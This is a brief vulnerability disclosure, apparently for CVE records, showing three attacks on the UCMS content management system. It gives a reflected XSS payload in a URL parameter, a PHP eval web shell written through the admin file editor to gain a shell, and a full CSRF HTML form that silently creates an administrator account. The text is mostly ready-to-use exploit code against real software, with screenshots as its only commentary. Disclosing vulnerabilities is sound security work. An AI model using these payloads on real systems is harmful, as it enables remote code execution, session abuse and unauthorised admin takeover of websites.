# XSS1
Access URL：http://www.a.com:85/ucms/index.php?do=sadmin_fileedit&dir=/ucms/user/%3Cscript%3Ealert(1)%3C/script%3E&file=mypost.php
![](https://github.com/AvaterXXX/CVEs/blob/master/images/ucms_xss_1-1.png)

-------------------------------------------
# GETSHELL
Create a 1.php file and submit
![](https://github.com/AvaterXXX/CVEs/blob/master/images/ucms_getshell_1-1.png)

Write poc：
`<?php eval($_POST['123']);?>`
![](https://github.com/AvaterXXX/CVEs/blob/master/images/ucms_getshell_1-2.png)

Getshell
![](https://github.com/AvaterXXX/CVEs/blob/master/images/ucms_getshell_1-3.png)

---------------------------------------------
# CSRF
After logging in, use POC to create an administrator account.
```
<html>
  <body>
    <form action="http://www.a.com:85/ucms/?do=user_addpost" method="POST">
      <input type="hidden" name="uuu_token" value="02ed31f4" />
      <input type="hidden" name="nickname" value="123" />
      <input type="hidden" name="username" value="test" />
      <input type="hidden" name="psd" value="test" />
      <input type="hidden" name="psd1" value="test" />
      <input type="hidden" name="b[]" value="1" />
      <input type="hidden" name="b[]" value="2" />
      <input type="hidden" name="alevel" value="3" />
      <input type="hidden" name="s[]" value="0" />
      <input type="hidden" name="s_0[]" value="4" />
      <input type="hidden" name="s[]" value="1" />
      <input type="hidden" name="s_1[]" value="0" />
      <input type="hidden" name="s_1[]" value="1" />
      <input type="hidden" name="s_1[]" value="2" />
      <input type="hidden" name="s_1[]" value="3" />
      <input type="hidden" name="s_1[]" value="4" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```
